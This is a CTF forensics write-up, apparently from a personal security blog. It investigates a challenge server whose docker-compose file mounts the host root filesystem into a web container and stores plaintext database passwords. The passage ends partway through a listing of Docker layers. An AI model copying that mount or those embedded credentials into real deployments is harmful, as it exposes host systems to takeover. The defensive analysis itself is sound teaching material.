@@ -1,0 +1,450 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[TamuCTF 2019] - Microservices - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[TamuCTF 2019] - Microservices"><meta property="og:description" content="0_Intrusion Welcome to MicroServices inc, where do all things micro and service oriented! Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?
+Filename MD5 hash Download link microservice.pcap 18d2c48f5d03d5faa5cb4473f9819b4b https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY What is the IP Address of the attacker? For this flag I don&rsquo;t have any real analysis, I just opened the PCAP file and looked at the different TCP conversations."><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/tamu2019microservices/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-02-28T21:57:40+08:00"><meta property="article:modified_time" content="2019-02-28T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[TamuCTF 2019] - Microservices"><meta name=twitter:description content="0_Intrusion Welcome to MicroServices inc, where do all things micro and service oriented! Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?
+Filename MD5 hash Download link microservice.pcap 18d2c48f5d03d5faa5cb4473f9819b4b https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY What is the IP Address of the attacker? For this flag I don&rsquo;t have any real analysis, I just opened the PCAP file and looked at the different TCP conversations."><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/tamu2019microservices/><link rel=prev href=maki.bzh/writeups/tamu2019readingrainbow/><link rel=next href=maki.bzh/writeups/tamu2019honeypots/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[TamuCTF 2019] - Microservices","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/tamu2019microservices\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"tamuctf, forensic, network, wireshark, pcap, cryptography, docker","wordcount":1722,"url":"maki.bzh\/writeups\/tamu2019microservices\/","datePublished":"2019-02-28T21:57:40+08:00","dateModified":"2019-02-28T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[TamuCTF 2019] - Microservices</h1><div class=content id=content><h2 id=0_intrusion>0_Intrusion</h2><blockquote><p>Welcome to MicroServices inc, where do all things micro and service oriented!
+Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out?</p></blockquote><table><thead><tr><th>Filename</th><th>MD5 hash</th><th>Download link</th></tr></thead><tbody><tr><td>microservice.pcap</td><td>18d2c48f5d03d5faa5cb4473f9819b4b</td><td><a href=https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY target=_blank rel="noopener noreffer">https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY</a></td></tr></tbody></table><ul><li>What is the IP Address of the attacker?</li></ul><p>For this flag I don&rsquo;t have any real analysis, I just opened the PCAP file and looked at the different TCP conversations. The IP that sends the most data and voila:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png data-srcset="/lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png, /lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png 1.5x, /lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png title=/lib/images/writeups/2019_tamuctf/microservice/0_intru_chall11.png></p><blockquote><p>Flag: 10.91.9.93</p></blockquote><h2 id=1_logs>1_Logs</h2><blockquote><p>Thanks for discovering the malicious IP. We will add it to our block list. We also got a disk image of the web server while you were working. Can you dig a little deeper for us?</p></blockquote><table><thead><tr><th>Filename</th><th>MD5</th><th>Download link</th></tr></thead><tbody><tr><td>filesystem.image</td><td>490c78e249177e6478539f459ca14e87</td><td><a href="https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI&export=download" target=_blank rel="noopener noreffer">https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI&export=download</a></td></tr></tbody></table><ul><li>What user was the attacker able to login as?</li><li>What is the date & time that the attacker logged in? (MM/DD:HH:MM:SS)</li></ul><p>Once the archive is finally downloaded, we&rsquo;ll mount it in readonly to avoid screwing everything inside:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>▶ mkdir aaa
+</span></span><span class=line><span class=cl>▶ sudo mount -o ro filesystem.image aaa
+</span></span></code></pre></td></tr></table></div></div><p>We know the attacker&rsquo;s IP (10.91.9.93) and we are looking for a connection. Let&rsquo;s see what the <code>auth.log</code> file contains:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices cat aaa/var/log/auth.log <span class=p>|</span> grep <span class=s1>&#39;10.91.9.93&#39;</span>
+</span></span><span class=line><span class=cl>Feb <span class=m>17</span> 00:06:04 ubuntu-xenial sshd<span class=o>[</span>15799<span class=o>]</span>: Accepted publickey <span class=k>for</span> root from 10.91.9.93 port <span class=m>41592</span> ssh2: RSA SHA256:lR4653Hv/Y9QthWvXFB2KkNPzQ1r8mItv83OgiCAR4g
+</span></span></code></pre></td></tr></table></div></div><p>We got all flags immediately:</p><blockquote><p>Flag 1: root
+Flag 2: 02/17:00:06:04</p></blockquote><h2 id=2_analysis>2_Analysis</h2><blockquote><p>Thanks for that information. Can you take a deeper dive now and figure out exactly how the attacker go in?</p></blockquote><ul><li>What is the name of the service that was used to compromise the machine? (All lowercase)</li><li>What is the md5sum of the initial compromising file?</li><li>What specific line in the initial compromising file was the most dangerous? (Actual line, spaces in front don&rsquo;t matter)</li></ul><p>During an investigation, my first reflex is to go to the folders of the different users (<code>/home</code>, <code>/root</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices tree -a -f aaa/root
+</span></span><span class=line><span class=cl>aaa/root
+</span></span><span class=line><span class=cl>├── aaa/root/.bashrc
+</span></span><span class=line><span class=cl>├── aaa/root/.cache
+</span></span><span class=line><span class=cl>│   └── aaa/root/.cache/motd.legal-displayed
+</span></span><span class=line><span class=cl>├── aaa/root/.profile
+</span></span><span class=line><span class=cl>└── aaa/root/.ssh
+</span></span><span class=line><span class=cl>    ├── aaa/root/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>    └── aaa/root/.ssh/id_rsa
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>➜  microservices tree -a -f aaa/home
+</span></span><span class=line><span class=cl>aaa/home
+</span></span><span class=line><span class=cl>└── aaa/home/ubuntu
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.ansible
+</span></span><span class=line><span class=cl>    │   └── aaa/home/ubuntu/.ansible/tmp
+</span></span><span class=line><span class=cl>    │       └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029
+</span></span><span class=line><span class=cl>    │           └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029/command
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.bash_logout
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.bashrc
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.cache
+</span></span><span class=line><span class=cl>    │   └── aaa/home/ubuntu/.cache/motd.legal-displayed
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.data
+</span></span><span class=line><span class=cl>    │   ├── aaa/home/ubuntu/.data/mysql
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log.00000001
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/aria_log_control
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/customers
+</span></span><span class=line><span class=cl>    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.frm
+</span></span><span class=line><span class=cl>    │   │   │   ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.ibd
+</span></span><span class=line><span class=cl>    │   │   │   └── aaa/home/ubuntu/.data/mysql/customers/db.opt
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/ib_buffer_pool
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/ibdata1
+</span></span><span class=line><span class=cl><span class=o>[</span>LOOOOOOTS OF MYSQL FILES<span class=o>]</span>
+</span></span><span class=line><span class=cl>    │   │   ├── aaa/home/ubuntu/.data/mysql/performance_schema
+</span></span><span class=line><span class=cl>    │   │   │   └── aaa/home/ubuntu/.data/mysql/performance_schema/db.opt
+</span></span><span class=line><span class=cl>    │   │   └── aaa/home/ubuntu/.data/mysql/tc.log
+</span></span><span class=line><span class=cl>    │   └── aaa/home/ubuntu/.data/redis
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/docker-compose.yml
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/id_rsa.pub
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/logs
+</span></span><span class=line><span class=cl>    │   ├── aaa/home/ubuntu/logs/access.log
+</span></span><span class=line><span class=cl>    │   ├── aaa/home/ubuntu/logs/error.log
+</span></span><span class=line><span class=cl>    │   └── aaa/home/ubuntu/logs/other_vhosts_access.log
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.profile
+</span></span><span class=line><span class=cl>    ├── aaa/home/ubuntu/.ssh
+</span></span><span class=line><span class=cl>    │   └── aaa/home/ubuntu/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>    └── aaa/home/ubuntu/.sudo_as_admin_successful
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>13</span> directories, <span class=m>112</span> files
+</span></span></code></pre></td></tr></table></div></div><p>We will search in the <code>/etc/passwd</code> file if there are no other users who have can access to a <strong>bash</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices cat aaa/etc/passwd <span class=p>|</span> grep bash
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>ubuntu❌1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+</span></span><span class=line><span class=cl>dev❌0:0:root:/root:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s funny, the user <code>dev</code> has <code>/root</code> as $HOME directory&mldr;</p><p>We see a <code>docker-composes.yml</code> file in the user&rsquo;s directory <strong>ubuntu</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices cat aaa/home/ubuntu/docker-compose.yml 
+</span></span><span class=line><span class=cl>version: <span class=s1>&#39;2&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>services:
+</span></span><span class=line><span class=cl>  web:
+</span></span><span class=line><span class=cl>    image: tamuctf/webfront:latest
+</span></span><span class=line><span class=cl>    restart: always
+</span></span><span class=line><span class=cl>    ports:
+</span></span><span class=line><span class=cl>      - <span class=s2>&#34;80:80&#34;</span>
+</span></span><span class=line><span class=cl>    environment:
+</span></span><span class=line><span class=cl>      - <span class=nv>DATABASE_URL</span><span class=o>=</span>mysql+pymysql://root:351BrE7aTQE8@db/customers
+</span></span><span class=line><span class=cl>      - <span class=nv>REDIS_URL</span><span class=o>=</span>redis://cache:6379
+</span></span><span class=line><span class=cl>    volumes:
+</span></span><span class=line><span class=cl>      - ./logs:/var/log/apache2
+</span></span><span class=line><span class=cl>      - /:/tmp
+</span></span><span class=line><span class=cl>    depends_on:
+</span></span><span class=line><span class=cl>      - db
+</span></span><span class=line><span class=cl>    networks:
+</span></span><span class=line><span class=cl>        default:
+</span></span><span class=line><span class=cl>        internal:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  db:
+</span></span><span class=line><span class=cl>    image: mariadb:10.2
+</span></span><span class=line><span class=cl>    restart: always
+</span></span><span class=line><span class=cl>    environment:
+</span></span><span class=line><span class=cl>      - <span class=nv>MYSQL_ROOT_PASSWORD</span><span class=o>=</span>351BrE7aTQE8
+</span></span><span class=line><span class=cl>      - <span class=nv>MYSQL_USER</span><span class=o>=</span>user
+</span></span><span class=line><span class=cl>      - <span class=nv>MYSQL_PASSWORD</span><span class=o>=</span>e68Qc2s0HsyR
+</span></span><span class=line><span class=cl>    volumes:
+</span></span><span class=line><span class=cl>      - .data/mysql:/var/lib/mysql
+</span></span><span class=line><span class=cl>    networks:
+</span></span><span class=line><span class=cl>        internal:
+</span></span><span class=line><span class=cl>    <span class=c1># This command is required to set important mariadb defaults</span>
+</span></span><span class=line><span class=cl>    command: <span class=o>[</span>mysqld, --character-set-server<span class=o>=</span>utf8mb4, --collation-server<span class=o>=</span>utf8mb4_unicode_ci, --wait_timeout<span class=o>=</span>28800, --log-warnings<span class=o>=</span>0<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  cache:
+</span></span><span class=line><span class=cl>    image: redis:4
+</span></span><span class=line><span class=cl>    restart: always
+</span></span><span class=line><span class=cl>    volumes:
+</span></span><span class=line><span class=cl>    - .data/redis:/data
+</span></span><span class=line><span class=cl>    networks:
+</span></span><span class=line><span class=cl>        internal:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>networks:
+</span></span><span class=line><span class=cl>    default:
+</span></span><span class=line><span class=cl>    internal:
+</span></span><span class=line><span class=cl>        internal: <span class=nb>true</span>
+</span></span></code></pre></td></tr></table></div></div><p>If you&rsquo;re a little familiar with Docker, you&rsquo;ve already found out where the attacker went. Line 13 of the file, the user is mounting the root directory in the /tmp folder of the container:</p><ul><li>/:/tmp</li></ul><p>As a result, the attacker compromised the webfront and got access to the host filesystem as <code>root</code> user. So he was able to retrieve the SSH private key from the host and logged in with.</p><p>The MD5 hash of the docker-composer.yml:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices md5sum aaa/home/ubuntu/docker-compose.yml
+</span></span><span class=line><span class=cl>a2111283f69aafcd658f558b0402fbc4  aaa/home/ubuntu/docker-compose.yml
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>Flag 1: docker
+Flag 2: a2111283f69aafcd658f558b0402fbc4
+Flag 3: - /:/tmp</p></blockquote><h2 id=3_forensics>3_Forensics</h2><blockquote><p>Thanks for that information. It seems that one of our developers didn&rsquo;t pay attention to what he was copying off of the internet. Can you help use figure out the extent of what the attacker was able to do?</p></blockquote><ul><li>What are the last names of customers who got compromised? (alphabetical order, Capitalized first letter, comma separated ex: Asdf,Bsdf)</li><li>What is the md5sum of the file that was used to exfiltrate data initially?</li><li>What is the md5sum of the file that was stolen after the attacker logged in?</li></ul><p>Something to know when you&rsquo;re doing forensic work with docker is: absolutely ALL about containers and other files/information related to this service is located here: <code>/var/lib/docker</code>.</p><p>Let&rsquo;s list the docker containers that have been used. We&rsquo;ll go looking for the one who climbs the root in the /tmp folder of the container:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/containers 
+</span></span><span class=line><span class=cl>90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e
+</span></span><span class=line><span class=cl>9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4
+</span></span><span class=line><span class=cl>c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da
+</span></span><span class=line><span class=cl>c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84
+</span></span></code></pre></td></tr></table></div></div><p>Each container created contains a configuration file in JSON:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/containers/*/config*
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/containers/90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e/config.v2.json
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/containers/9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4/config.v2.json
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/containers/c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da/config.v2.json
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/containers/c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84/config.v2.json
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>➜  microservices cat aaa/var/lib/docker/containers/*/config.v2.json <span class=p>|</span> jq <span class=p>|</span> grep -E <span class=s1>&#39;&#34;ID&#34;|&#34;Image&#34;&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ID&#34;</span>: <span class=s2>&#34;90814f0051eed67a4dd291c8e3f44836c3cf3bd793818eba2e9ae7d0eedc661e&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;tamuctf/kaliimage&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;sha256:420f4338bea593a9a96151c51b3f5550fac8f7c29cb41c451b4d07c02cf9b28d&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ID&#34;</span>: <span class=s2>&#34;9e7b7ad707af6c0d04591d59e1b7570b784fc194c1847170d40bafc873da85d4&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;redis:4&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;sha256:3ddb7885a5e075ba8ed414d0706059999aa73fceb4249bef7cb293c1ec559dfc&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ID&#34;</span>: <span class=s2>&#34;c7b26c91b07eef1f63c8ea3351477f2344e1873f2af8a1566954ecd0678982da&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;mariadb:10.2&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;sha256:907f5f6c749d16ddd8f4a75353228a550d8eddd78693f4329c90ce51a99ec875&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;ID&#34;</span>: <span class=s2>&#34;c8c5438a36920a02375b7fffba9065769a3657ee48d522b5ac9a8eec18b1ad84&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;tamuctf/webfront:latest&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Image&#34;</span>: <span class=s2>&#34;sha256:05585189bd6cb140d5fcee52b95a05a202f3aa2ae62743a749d0d82bcacfbc5c&#34;</span>,
+</span></span></code></pre></td></tr></table></div></div><p>A surprising image is here: <strong>kaliimage</strong>. Image Docker which has nothing to do on a web server&mldr;</p><p>In the <code>/var/lib/lib/docker/overlay2/</code> folder there are all the intermediate versions of the docker containers, in the form of a hash. Kind of like the commits for GitHub.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices ls aaa/var/lib/docker/overlay2 
+</span></span><span class=line><span class=cl>030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
+</span></span><span class=line><span class=cl>06aa47c261686f54296a2da65bfea7ed577ff79ce2263a320c95f73e2ad51db1
+</span></span><span class=line><span class=cl>0bdd99e71211b7d42c48fc86936089b1766af62159e78554434d3b7762f88bb4
+</span></span><span class=line><span class=cl>0dfa81ec47cc9d78701052f24ce164b114279abb425af227eb7664624d64c848
+</span></span><span class=line><span class=cl>101c6052088fb1d7b9bf6331ae2e3a052a5480b14a5e48e43eb465914880cd68
+</span></span><span class=line><span class=cl>146731568c44e1ab0d9a339166cd67189b51f6e0166b301f86557aef05b0d55d
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Each of these folders has the same architecture:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>➜  microservices tree aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f 
+</span></span><span class=line><span class=cl>aaa/var/lib/docker/overlay2/030086336adcdf22311680627f9ec604012ecf86ed7f87b2f20c21be94a7e91f
+</span></span><span class=line><span class=cl>├── diff
+</span></span><span class=line><span class=cl>│   └── etc
